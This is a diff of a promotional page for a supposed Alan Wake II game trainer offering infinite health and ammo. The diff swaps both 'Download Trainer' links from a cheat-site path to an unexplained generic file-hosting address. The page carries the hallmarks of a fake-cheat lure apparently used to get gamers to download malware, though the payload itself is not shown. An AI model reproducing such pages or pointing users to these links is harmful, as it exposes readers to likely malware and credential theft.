@@ -4,14 +4,14 @@
 
 Dive deeper into the haunting world of Alan Wake II with this all-encompassing trainer. Designed to enhance your gaming experience, it offers features like infinite health, unlimited ammo, and extended flashlight duration. Whether you're aiming to breeze through challenging sections or explore the narrative without constraints, this trainer has got you covered.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/alan-wake-ii)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload4.bitbucket.io)
 ---
 
 ## Product Description
 
 The Alan Wake II Trainer is a powerful tool that integrates seamlessly with your game, providing real-time enhancements to elevate your gameplay. With a user-friendly interface and a plethora of features, it's the perfect companion for both new and seasoned players.
 
-[![Download Trainer](https://portalvirtualreality.ru/wp-content/uploads/2023/11/AWII_Launch_16-10-23_013-scaled.webp)](https://wecheaters.github.io/cheats/alan-wake-ii)
+[![Download Trainer](https://portalvirtualreality.ru/wp-content/uploads/2023/11/AWII_Launch_16-10-23_013-scaled.webp)](https://fileoffload4.bitbucket.io)
 ---
 
 ## Key Features
